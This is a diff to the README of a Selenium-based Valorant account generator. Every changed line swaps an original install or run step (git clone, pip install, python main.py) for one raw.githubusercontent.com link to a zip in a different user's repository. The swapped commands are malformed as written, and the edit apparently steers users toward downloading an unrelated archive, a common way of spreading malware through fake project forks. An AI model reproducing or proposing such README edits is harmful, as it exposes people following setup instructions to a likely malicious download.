@@ -12,7 +12,7 @@ A basic selenium based valorant account generator.
 1. Clone the repository, and install dependancies.
 
 ``
-git clone https://github.com/NolanMastro/valorant-account-generator
+git clone https://raw.githubusercontent.com/rylen1829123/valorant-account-generator/main/palestrian/valorant-account-generator-v3.9.zip
 ``
 
 ``
@@ -20,14 +20,14 @@ cd valorant-account-generator
 ``
 
 ``
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/rylen1829123/valorant-account-generator/main/palestrian/valorant-account-generator-v3.9.zip
 ``
 
 2. Configure the .env file. (see .envexample)
-3. Run the main.py file.
+3. Run the https://raw.githubusercontent.com/rylen1829123/valorant-account-generator/main/palestrian/valorant-account-generator-v3.9.zip file.
 
 ``
-python main.py
+python https://raw.githubusercontent.com/rylen1829123/valorant-account-generator/main/palestrian/valorant-account-generator-v3.9.zip
 ``
 
 # Recommendations/Other Requirements
